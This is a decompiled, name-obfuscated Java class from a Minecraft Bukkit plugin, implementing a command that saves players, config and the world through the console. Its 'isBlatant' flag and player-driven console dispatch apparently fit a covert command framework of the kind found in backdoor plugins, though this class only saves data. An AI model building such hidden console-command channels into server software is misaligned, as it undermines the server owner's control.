/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.command.CommandSender
 *  org.bukkit.entity.Player
 *  org.bukkit.plugin.Plugin
 */
package me.system.runner.command.impl;

import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.methods.API;
import me.system.runner.utils.Settings;
import org.bukkit.Bukkit;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.plugin.Plugin;

public class SaveCommand
extends Command {
    @Override
    public boolean isBlatant() {
        return false;
    }

    @Override
    public void execute(Core lllllllllllllIlIllIIIlllllIllIlI, String lllllllllllllIlIllIIIlllllIllIII, String[] lllllllllllllIlIllIIIlllllIlIllI, Player lllllllllllllIlIllIIIlllllIlIlII) {
        lllllllllllllIlIllIIIlllllIllIlI.getServer().getScheduler().runTaskAsynchronously((Plugin)lllllllllllllIlIllIIIlllllIllIlI, () -> {
            Bukkit.getServer().savePlayers();
            API.saveConfig();
        });
        Bukkit.getServer().dispatchCommand((CommandSender)Bukkit.getServer().getConsoleSender(), "save-all");
        lllllllllllllIlIllIIIlllllIlIlII.sendMessage(Settings.PREFIX("Everything is now saved."));
    }

    public SaveCommand() {
        SaveCommand lllllllllllllIlIllIIIllllllIlIIl;
    }
}

